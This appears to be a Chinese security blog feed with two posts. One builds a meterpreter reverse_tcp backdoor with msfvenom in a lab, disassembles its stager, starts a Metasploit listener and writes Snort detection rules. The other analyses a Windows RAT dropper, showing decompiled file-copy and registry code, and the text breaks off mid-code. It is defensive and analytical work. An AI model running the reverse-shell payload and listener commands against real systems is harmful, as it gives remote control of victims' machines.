    <content type="html"><![CDATA[<p>Snort是一个开源的网络入侵检测系统，根据官方文档简单地学习了一下使用方法之后试一下实战应用，实战对象就是大名鼎鼎的meterpreter。</p><p><strong>安装Snort</strong></p><p>安装Snort的方法网上有教程，因此就不多说了，最简单的方法就是apt-get。</p><p>Kali启动！</p><p>用Kali Linux中的msfvenom生成一个后门程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.60.130 LPORT=6666 -f elf &gt; shell.elf<br></code></pre></td></tr></table></figure><span id="more"></span><p>生成好了</p><p><img src="https://i.loli.net/2019/05/19/5ce15e9ff038d28430.png"></p><h2 id="msfvenom后门分析"><a href="#msfvenom后门分析" class="headerlink" title="msfvenom后门分析"></a>msfvenom后门分析</h2><p>看一下msfvenom生成后门的情况，后门的大小只有207字节，十分短小精悍，实际上msfvenom生成的后门是有多种类型的，一种是生成一个完整的后门，后门中直接就有实现后门功能的代码，还有一种就是我们此次分析过程中用到的“微型后门”，运行后通过从黑客主机上加载真正的payload，称为反射型DLL注入，相比前者，后者更加隐蔽，后门难以被杀软发现，VT上60个反病毒引擎只有11个检测出来了：</p><p><img src="https://i.loli.net/2019/05/20/5ce2014e9dd0b72780.png"></p><p>winhex中木马的视图：</p><p><img src="https://i.loli.net/2019/05/20/5ce1f0c68c24212829.png"></p><p>放到IDA中看一下反汇编结果，发现函数调用是通过<code>int 80h</code>(Linux系统调用)的方式来调用的，主要代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs asm">LOAD:08048057                 xor     ebx, ebx<br>LOAD:08048059                 mul     ebx<br>LOAD:0804805B                 push    ebx<br>LOAD:0804805C                 inc     ebx             ; call<br>LOAD:0804805D                 push    ebx<br>LOAD:0804805E                 push    2<br>LOAD:08048060                 mov     al, 102<br>LOAD:08048062                 mov     ecx, esp        ; args<br>LOAD:08048064                 int     80h             ; sys_socketcall<br>LOAD:08048066                 xchg    eax, edi<br>LOAD:08048067                 pop     ebx<br>LOAD:08048068                 push    10000010001111001010100011000000b   //IP：192.168.60.130，虚拟机IP<br>LOAD:0804806D                 push    1010000110100000000000000010b //端口6666<br>LOAD:08048072                 mov     ecx, esp<br>LOAD:08048074                 push    66h<br>LOAD:08048076                 pop     eax<br>LOAD:08048077                 push    eax<br>LOAD:08048078                 push    ecx<br>LOAD:08048079                 push    edi<br>LOAD:0804807A                 mov     ecx, esp<br>LOAD:0804807C                 inc     ebx<br>LOAD:0804807D                 int     80h             ; sys_socketcall<br>LOAD:0804807F                 test    eax, eax<br>LOAD:08048081                 jns     short loc_804809C<br>LOAD:08048083                 dec     esi<br>LOAD:08048084                 jz      short sys_exit_loc_80480C3<br>LOAD:08048086                 push    162<br>LOAD:0804808B                 pop     eax<br>LOAD:0804808C                 push    0<br>LOAD:0804808E                 push    5<br>LOAD:08048090                 mov     ebx, esp        ; req<br>LOAD:08048092                 xor     ecx, ecx        ; rem<br>LOAD:08048094                 int     80h             ; LINUX - sys_nanosleep<br>LOAD:08048096                 test    eax, eax<br>LOAD:08048098                 jns     short loc_8048057<br>LOAD:0804809A                 jmp     short sys_exit_loc_80480C3<br>LOAD:0804809C ; ---------------------------------------------------------------------------<br>LOAD:0804809C<br>LOAD:0804809C loc_804809C:                            ; CODE XREF: start+2D↑j<br>LOAD:0804809C                 mov     dl, 7<br>LOAD:0804809E                 mov     ecx, 1000h<br>LOAD:080480A3                 mov     ebx, esp<br>LOAD:080480A5                 shr     ebx, 0Ch<br>LOAD:080480A8                 shl     ebx, 0Ch<br>LOAD:080480AB                 mov     al, 125         ; sys_mprotect<br>LOAD:080480AD                 int     80h             ; LINUX -<br>LOAD:080480AF                 test    eax, eax<br>LOAD:080480B1                 js      short sys_exit_loc_80480C3<br>LOAD:080480B3                 pop     ebx<br>LOAD:080480B4                 mov     ecx, esp<br>LOAD:080480B6                 cdq<br>LOAD:080480B7                 mov     dh, 0Ch<br>LOAD:080480B9                 mov     al, 3<br>LOAD:080480BB                 int     80h             ; LINUX - sys_read<br>LOAD:080480BD                 test    eax, eax<br>LOAD:080480BF                 js      short sys_exit_loc_80480C3<br>LOAD:080480C1                 jmp     ecx<br>LOAD:080480C3 ; ---------------------------------------------------------------------------<br>LOAD:080480C3<br>LOAD:080480C3 sys_exit_loc_80480C3:                   ; CODE XREF: start+30↑j<br>LOAD:080480C3                                         ; start+46↑j ...<br>LOAD:080480C3                 mov     eax, 1<br>LOAD:080480C8                 mov     ebx, 1          ; status<br>LOAD:080480CD                 int     80h             ; LINUX - sys_exit<br></code></pre></td></tr></table></figure><p>经过分析可以得出此木马的大致流程：</p><p><img src="https://i.loli.net/2019/05/20/5ce1fc7ca007515510.png"></p><h2 id="后门通信流量分析"><a href="#后门通信流量分析" class="headerlink" title="后门通信流量分析"></a>后门通信流量分析</h2><p>将后门程序复制到Ubuntu中，在运行之前在Kali上打开Wireshark和MSF</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf &gt; use exploit/multi/handler<br>msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload linux/x86/meterpreter/reverse_tcp<br>payload =&gt; linux/x86/meterpreter/reverse_tcp<br>msf exploit(multi/handler) &gt; show options<br><br>Module options (exploit/multi/handler):<br><br>   Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------<br><br>Payload options (linux/x86/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST                   <span class="hljs-built_in">yes</span>       The listen address (an interface may be specified)<br>   LPORT  4444             <span class="hljs-built_in">yes</span>       The listen port<br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Wildcard Target<br><br>msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.60.130<br>LHOST =&gt; 192.168.60.130<br>msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LPORT 6666<br>LPORT =&gt; 6666<br>msf exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.60.130:6666 <br><br></code></pre></td></tr></table></figure><p>Wireshark开启抓包之后就可以启动Ubuntu上的后门程序了，一运行这个后门程序，Kali中就马上接收到了弹回的Shell，在进行几个常见后门控制命令的操作之后停止抓包对数据包进行分析。</p><h3 id="流量分析思路"><a href="#流量分析思路" class="headerlink" title="流量分析思路"></a>流量分析思路</h3><p>此处对流量分析有两个思路，一个是直接对木马server端IP和端口进行检测，另一个就是通过识别流量特征来进行检测。</p><p>由于木马端的IP和端口是固定的，所以规则很好编写，在这里就不再多说，重点放在通信数据包的内容识别上，下面是攻击机与受害主机通信过程中数据放在<code>binwalk</code>中的识别结果，可见<code>binwalk</code>识别出了这些数据中包含一个ELF文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> ⚡ root@Kali ~/Snort_test binwalk -e pack.bin<br><br>DECIMAL       HEXADECIMAL     <span class="hljs-keyword">DESCRIPTION</span><br>--------------------------------------------------------------------------------<br><span class="hljs-number">106</span>           <span class="hljs-number">0</span>x6A            ELF, <span class="hljs-number">32</span>-bit LSB shared object, Intel <span class="hljs-number">80386</span>, version <span class="hljs-number">1</span> (SYSV)<br><span class="hljs-number">603274</span>        <span class="hljs-number">0</span>x9348A         Base64 standard index table<br><span class="hljs-number">607677</span>        <span class="hljs-number">0</span>x945BD         Unix path: <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin:/u</span>sr<span class="hljs-regexp">/local/</span>bin:<span class="hljs-regexp">/usr/</span>sbin:<span class="hljs-regexp">/usr/</span>bin:<span class="hljs-regexp">/sbin:/</span>bin:<span class="hljs-regexp">/usr/g</span>ames:<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/games:/</span>system<span class="hljs-regexp">/bin:/</span>system<span class="hljs-regexp">/sbin:/</span>system/xbin<br><span class="hljs-number">617386</span>        <span class="hljs-number">0</span>x96BAA         Base64 standard index table<br><span class="hljs-number">629219</span>        <span class="hljs-number">0</span>x999E3         Unix path: <span class="hljs-regexp">/usr/</span>bin/ntlm_auth<br><span class="hljs-number">630378</span>        <span class="hljs-number">0</span>x99E6A         Base64 standard index table<br><span class="hljs-number">633932</span>        <span class="hljs-number">0</span>x9AC4C         PEM certificate<br><span class="hljs-number">639609</span>        <span class="hljs-number">0</span>x9C279         PEM RSA <span class="hljs-keyword">private</span> key<br><span class="hljs-number">639850</span>        <span class="hljs-number">0</span>x9C36A         SHA256 hash constants, little endian<br><span class="hljs-number">640266</span>        <span class="hljs-number">0</span>x9C50A         Base64 standard index table<br><span class="hljs-number">647099</span>        <span class="hljs-number">0</span>x9DFBB         Unix path: <span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/system/</span>cpu<span class="hljs-regexp">/cpu%d/</span>cpufreq/cpuinfo_max_freq<br><span class="hljs-number">647878</span>        <span class="hljs-number">0</span>x9E2C6         Unix path: <span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>%s/speed<br><span class="hljs-number">648311</span>        <span class="hljs-number">0</span>x9E477         Unix path: <span class="hljs-regexp">/dev/</span>disk/by-uuid<br><span class="hljs-number">649497</span>        <span class="hljs-number">0</span>x9E919         Copyright string: <span class="hljs-string">&quot;Copyright 1995-2013 Jean-loup Gailly and Mark Adler &quot;</span><br><span class="hljs-number">652665</span>        <span class="hljs-number">0</span>x9F579         Copyright string: <span class="hljs-string">&quot;Copyright 1995-2013 Mark Adler &quot;</span><br><span class="hljs-number">655530</span>        <span class="hljs-number">0</span>xA00AA         CRC32 polynomial table, little endian<br><span class="hljs-number">659626</span>        <span class="hljs-number">0</span>xA10AA         CRC32 polynomial table, big endian<br><span class="hljs-number">667154</span>        <span class="hljs-number">0</span>xA2E12         Unix path: <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin:/</span>bin:<span class="hljs-regexp">/usr/</span>bin<br><span class="hljs-number">669796</span>        <span class="hljs-number">0</span>xA3864         Unix path: <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/nscd/</span>socket<br></code></pre></td></tr></table></figure><p>可以从Wireshark中看到流量的高峰值，此时应该是正在传输用于反射型DLL注入的数据</p><p><img src="https://i.loli.net/2019/05/21/5ce34df99c9eb75679.png"></p><p>将数据文件直接放到IDA中进行分析可以看到ELF部分的代码逻辑，由于没有正确的修复ELF文件头，且偏移位置也未手动修复，所以IDA无法正确识别出导入函数导出函数等部分，但是这不重要了，多次测试meterpreter传递的数据，发现针对此攻击环境数据包的内容并无明显变化，尤其是ELF文件部分前后测试中完全一致，因此可以初步推测meterpreter针对于同一后门文件并无数据混淆， 那么就可以将数据包中的部分具有特征的数据作为特征值进行匹配了，与此同时应该注意选取的特征值应该具有一定的辨识性，避免误报情况的产生。</p><h3 id="规则编写"><a href="#规则编写" class="headerlink" title="规则编写"></a>规则编写</h3><p>攻击机IP（Kali Linux）：192.168.60.130</p><p>受害者IP（Ubuntu）：192.168.60.131</p><p><strong>定义变量</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var</span> Attacker_NET $(Attacker_NET:-<span class="hljs-number">192.168.60.130</span>/<span class="hljs-number">24</span>)<br><span class="hljs-attribute">var</span> Victim_NET $(Victim_NET:-<span class="hljs-number">192.168.60.131</span>/<span class="hljs-number">24</span>)<br></code></pre></td></tr></table></figure><p>在确定木马IP地址的情况下可以直接编写规则alert一切与木马server端IP通信的数据包</p><p>规则有多种不同的实现方式：</p><ul><li>对主机与恶意IP的所有数据包警报：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruls">alert tcp Attacker_NET any &lt;&gt; Victim_NET any (msg: &quot;A malicious IP attack was detected&quot;;sid:1)<br></code></pre></td></tr></table></figure><ul><li>对通信过程中的某些数据警报：</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">alert tcp Attacker_NET any &lt;&gt; Victim_NET any (<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;|6D626564746C735F706C6174666F726D5F656E74726F70795F706F6C6C00657865637665006D626564746C735F6374725F647262675F72616E646F6D0077656263616D5F73746F70005F696E69740077656263616D5F7374617274005F5F676D740077656263616D5F6765745F6672616D65006D61696E00617564696F5F6D69635F6C6973740077656263616D5F6C697374005F66696E6900617564696F5F6D69635F737461727400617564696F5F6D69635F73746F70006D626564746C735F783530395F6372745F70726F66696C655F64656661756C74006D626564746C735F656E74726F70795F66756E63|&quot;</span>;msg:<span class="hljs-string">&quot;Malicious file detecteds&quot;</span>;sid:<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>规则编写无明确的限制，个人认为规则的标准在于效率和准确率。</p><h3 id="应用规则"><a href="#应用规则" class="headerlink" title="应用规则"></a>应用规则</h3><p>注释掉除了自己的规则以外的其他所有规则：</p><p><img src="https://i.loli.net/2019/05/24/5ce77e98ee8d332359.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo snort -c <span class="hljs-regexp">/etc/</span>snort/snort.conf -A console<br></code></pre></td></tr></table></figure><p>检测结果：</p><p><img src="https://i.loli.net/2019/05/24/5ce78a7c6efcc77881.png"></p><p>检测成功</p><h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><p>Snort是一款好工具，<del>废话</del>，但是在实验过程中发现由于性能问题，有的数据包会来不及处理，这可能是Snort在实际环境中部署时需要解决的问题。而且觉得类似于此类规则匹配的IDS应该可以与机器学习结合一下，规则不再需要网络安全管理员手动添加，而是根据机器学习智能化识别，或许是一个很不错的想法。</p>]]></content>
    
    
    <categories>
      
      <category>入侵检测</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Snort</tag>
      
      <tag>IDS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>远程控制木马分析报告</title>
    <link href="/2019/05/%E6%9F%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    <url>/2019/05/%E6%9F%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<h2 id="样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx-EXE"><a href="#样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx-EXE" class="headerlink" title="样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE"></a>样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE</h2><h3 id="样本基本信息："><a href="#样本基本信息：" class="headerlink" title="样本基本信息："></a>样本基本信息：</h3><table><thead><tr><th>属性</th><th>值</th></tr></thead><tbody><tr><td>Filename</td><td>18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE</td></tr><tr><td>MD5</td><td>b9b34748f958c31e12ae3741f728be99</td></tr><tr><td>SHA-1</td><td>a806386497e280612eadbe87e2104550c95ab617</td></tr><tr><td>File Type</td><td>Win32 EXE</td></tr><tr><td>Magic</td><td>MS-DOS executable PE  for MS Windows (GUI) Intel 80386 32-bit</td></tr><tr><td>SSDeep</td><td>12288:DKGk6+Tjk6PQEAEd0bpkRgNyPBODdgVRX6Tw:Dz+TwNE0NfcAT</td></tr><tr><td>File Size</td><td>467.39 KB</td></tr></tbody></table><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE</p><span id="more"></span><p>将文件载入到IDA中，分析start函数，找到了一些相对不重要的函数和一个负责主要逻辑的函数</p><p><img src="https://i.loli.net/2019/05/15/5cdc158f0cb0278057.png"></p><p>找到关键函数sub_401A40()</p><p><img src="https://i.loli.net/2019/05/15/5cdc15bc42cb211720.png"></p><p>通过查看函数调用图判断此函数的大致执行流：</p><p><img src="https://i.loli.net/2019/05/15/5cdc169e9627667242.png"></p><p>通过API判断此函数的主要功能：文件读写，文件遍历，疑似反调试，创建进程。</p><p>通过以上结论判断此文件为病毒Droper，载入OD对关键函数进一步分析：</p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>此处省略沙箱中的执行结果，将沙箱的分析结果作为动态分析的辅助提示进行动态分析。</p><p>获取当前程序的文件名和所在文件路径：</p><p><img src="https://i.loli.net/2019/05/15/5cdc18fe3d31b90747.png"></p><p>进入子函数，获取当前文件路径</p><p><img src="https://i.loli.net/2019/05/15/5cdc1a4f86aae86984.png"></p><p>获取自身文件指针，将文件读取到内存中：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1b0d97ac894126.png"></p><p>用GetWindowsDirectoryA()函数获取Windows目录：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1b66821d940005.png"></p><p><img src="https://i.loli.net/2019/05/15/5cdc1b81264f266481.png"></p><p>进行字符串拼接：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1bc33218874582.png"></p><p>拼接出新的路径：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1c16d21cb31371.png"></p><p>新的文件名：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1c550dae989048.png"></p><p>删除自身：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1ca3357e325075.png"></p><p>将内存中的数据写入到新的文件中：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1ccb120c867019.png"></p><p>创建目录18xxxxxxxxxxxxxxxxx</p><p><img src="https://i.loli.net/2019/05/16/5cdd23b441d3c37779.png"></p><p>循环拼接出要写入的文件的文件名：</p><p><img src="https://i.loli.net/2019/05/17/5cde78b69c1c975221.png"></p><p>整体流程如下：</p><p>函数sub404260负责将图片写入，每存储一张照片就将.liz后缀的临时文件删除：</p><p><img src="https://i.loli.net/2019/05/16/5cdd41c7c6fe925052.png"></p><p>除了色情图片，程序还释放了一个名为Thumbs.db的文件。</p><p><img src="https://i.loli.net/2019/05/16/5cdd42826bc4a18095.png"></p><p>启动远控进程rat.EXE：</p><p><img src="https://i.loli.net/2019/05/15/5cdc20083a95036171.png"></p><p>检测两个进程–熊猫卫士和趋势科技的杀软：</p><p><img src="https://i.loli.net/2019/05/17/5cde1fe31442025832.png"></p><p>删除文件<code>C:\Users\Hvnt3r\AppData\Local\Temp\\byeyou.tmp</code>：</p><p><img src="https://i.loli.net/2019/05/15/5cdc2134e3cbd96760.png"></p><p>文件复制：</p><p><img src="https://i.loli.net/2019/05/17/5cde7891d1d4541153.png"></p><p><img src="https://i.loli.net/2019/05/16/5cdd177b5e8ca31906.png"></p><h3 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h3><p>得出此程序的功能：</p><ul><li>创建同名目录并在目录下释放文件</li><li>杀毒软件检测</li><li>在<code>C:\Users\Hvnt3r\AppData\Local\Temp\</code>目录创建byeyou.tmp备份文件</li><li>在<code>C:\Users\Hvnt3r\AppData\Local\Temp\</code>目录创建rat.EXE后门程序并启动此程序</li></ul><p>此程序是一个Dropper，完成恶意文件的释放过程，接下来分析此文件释放出的文件rat.EXE。</p><h2 id="子程序分析rat-EXE"><a href="#子程序分析rat-EXE" class="headerlink" title="子程序分析rat.EXE"></a>子程序分析rat.EXE</h2><p>从名字看这个应该是一个远程控制程序，但是为了避免恶意代码编写者故意使用特殊的文件名来误导分析者的思路，因此还是要重点分析一下。</p><h3 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h3><p><img src="https://i.loli.net/2019/05/16/5cdd786a2baea45581.png"></p><p><img src="https://i.loli.net/2019/05/16/5cdd7881c271258701.png"></p><p>从函数的调用关系来看这个程序可能有如下作用：</p><p>文件读写、注册表修改、从程序资源节释放文件、进程相关操作。</p><p>既然看到了常见的程序资源节的相关函数，将程序载入到ResourceHacker中看一下，果然在资源节中发现了一个疑似的PE文件：</p><p><img src="https://i.loli.net/2019/05/16/5cdd796f1749290138.png"></p><p>将文件提取出来存储为rsc.exe，稍后分析。</p><p>程序的基本静态分析结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( ExpandEnvironmentStringsA(Src, &amp;Dst, <span class="hljs-number">0x104</span>u) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( CreateDirectoryA(&amp;Dst, <span class="hljs-number">0</span>) == <span class="hljs-number">1</span> )<br>    &#123;<br>      SHGetSpecialFolderPathA(<span class="hljs-number">0</span>, &amp;pszPath, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">// 获取某一文件的路径</span><br>      GetShortPathNameA(&amp;pszPath, &amp;szShortPath, <span class="hljs-number">0x104</span>u);<span class="hljs-comment">// 获取指定路径的短路径形式</span><br>      <span class="hljs-built_in">strcat</span>(&amp;szShortPath, asc_403234);         <span class="hljs-comment">// \*.*</span><br>      <span class="hljs-built_in">strcpy</span>(&amp;szLongPath, &amp;Dst);<br>      <span class="hljs-built_in">strcat</span>(&amp;szLongPath, asc_403230);          <span class="hljs-comment">// \</span><br><span class="hljs-comment">      GetShortPathNameA(&amp;szLongPath, &amp;v22, 0x104u);// 获取指定路径的短路径形式</span><br>      <span class="hljs-built_in">sprintf</span>(&amp;Dest, aCmdExeCCopySS, &amp;szShortPath, &amp;v22);<span class="hljs-comment">// cmd.exe /c copy %s %s</span><br>      <span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(StartupInfo));<br>      StartupInfo.wShowWindow = <span class="hljs-number">0</span>;<br>      StartupInfo.cb = <span class="hljs-number">68</span>;<br>      StartupInfo.dwFlags = <span class="hljs-number">1</span>;<br>      CreateProcessA(<span class="hljs-number">0</span>, &amp;Dest, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);<span class="hljs-comment">// 执行CMD命令，完成文件复制操作</span><br>      WaitForSingleObject(ProcessInformation.hProcess, <span class="hljs-number">0xFFFFFFFF</span>);<br>      <span class="hljs-keyword">if</span> ( !ExpandEnvironmentStringsA(aAllusersprofil_0, &amp;v23, <span class="hljs-number">0x104</span>u) )<span class="hljs-comment">// %ALLUSERSPROFILE%\Application Data\Microsoft</span><br>                                                <span class="hljs-comment">// 将环境变量补充维完整形式</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      GetShortPathNameA(&amp;v23, &amp;v17, <span class="hljs-number">0x104</span>u);<br>      <span class="hljs-built_in">sprintf</span>(&amp;CommandLine, aRegeditExeSESB, &amp;v17);<span class="hljs-comment">// regedit.exe /s /e  %s\back1.reg &quot;HKEY_CURRENT_USER\Software\Micro</span><br>      <span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(StartupInfo));<br>      StartupInfo.wShowWindow = <span class="hljs-number">0</span>;<br>      StartupInfo.cb = <span class="hljs-number">68</span>;<br>      StartupInfo.dwFlags = <span class="hljs-number">1</span>;<br>      CreateProcessA(<span class="hljs-number">0</span>, &amp;CommandLine, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);<span class="hljs-comment">// 执行注册表备份</span><br>      <span class="hljs-built_in">sprintf</span>(&amp;CommandLine, aRegeditExeSESB_0, &amp;v17);<span class="hljs-comment">// cmd.exe /c copy %s %s</span><br>      WaitForSingleObject(ProcessInformation.hProcess, <span class="hljs-number">0xFFFFFFFF</span>);<br>      <span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(StartupInfo));<br>      StartupInfo.wShowWindow = <span class="hljs-number">0</span>;<br>      StartupInfo.cb = <span class="hljs-number">68</span>;<br>      StartupInfo.dwFlags = <span class="hljs-number">1</span>;<br>      CreateProcessA(<span class="hljs-number">0</span>, &amp;CommandLine, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);<span class="hljs-comment">// 执行文件复制</span><br>      WaitForSingleObject(ProcessInformation.hProcess, <span class="hljs-number">0xFFFFFFFF</span>);<br>      <span class="hljs-keyword">if</span> ( RegOpenKeyExA(HKEY_CURRENT_USER, SubKey, <span class="hljs-number">0</span>, <span class="hljs-number">0xF003F</span>u, &amp;phkResult) )<span class="hljs-comment">// Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      RegSetValueExA(phkResult, ValueName, <span class="hljs-number">0</span>, <span class="hljs-number">1u</span>, &amp;Dst, <span class="hljs-built_in">strlen</span>(&amp;Dst) + <span class="hljs-number">1</span>);<span class="hljs-comment">// 